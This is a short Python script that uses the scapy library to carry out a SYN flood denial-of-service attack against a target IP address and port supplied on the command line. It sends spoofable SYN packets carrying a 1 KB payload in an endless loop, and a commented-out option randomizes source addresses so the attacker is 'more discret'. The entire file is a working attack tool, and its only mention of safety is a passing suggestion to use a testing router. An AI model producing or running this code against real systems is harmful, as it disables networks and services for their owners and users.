# SYN Flooding attack

from scapy.all import * 
import argparse

#create an argumentParser object
parser = argparse.ArgumentParser(description="Simple SYN Flood script")
parser.add_argument("target_ip", help="Targhet IP adress (e.g router's IP)")
parser.add_argument("-p", "--port", type=int, help="Destination port (the port of the target machine service, 80 -> HTTP, 22 -> SSH).")

# parse arguments from the CLI
args = parser.parse_args() 

# target IP address ( use a testing router =D <3 )
target_ip = args.target_ip 

# target port
target_port = args.port

#Create IP packet
ip = IP(dst=target_ip) # type: ignore
# we can use IP spoofing (to be more discret)
#ip = IP(src=RandIP("192.168.1.1/24"),dst=target_ip)

# Create layer 4 => with random source port (1-65535)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S") # type: ignore

# Flooding data ( 1 KB )
raw = Raw(b"X"*1024) 


# STACK up the layers
p = ip/tcp/raw

# Send the constructed packet in a loop until CTRL+C is detected (kill the process)
send(p,loop=1,verbose=0)